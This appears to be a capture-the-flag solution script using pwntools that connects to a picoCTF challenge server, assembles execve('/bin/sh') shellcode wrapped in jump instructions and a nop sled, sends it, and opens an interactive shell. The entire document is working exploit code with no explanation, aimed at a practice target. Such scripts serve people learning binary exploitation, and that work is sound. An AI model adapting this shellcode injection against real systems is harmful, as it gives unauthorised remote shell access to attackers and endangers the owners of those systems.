from pwn import *

r = remote("mercury.picoctf.net", 37853)

shellcode = shellcraft.execve('/bin/sh')

payload = asm('jmp $+0x60 ; ' + shellcode + 'nop ; ' * 20 + 'jmp $+0x51 ;')

r.sendline(payload)

r.interactive()
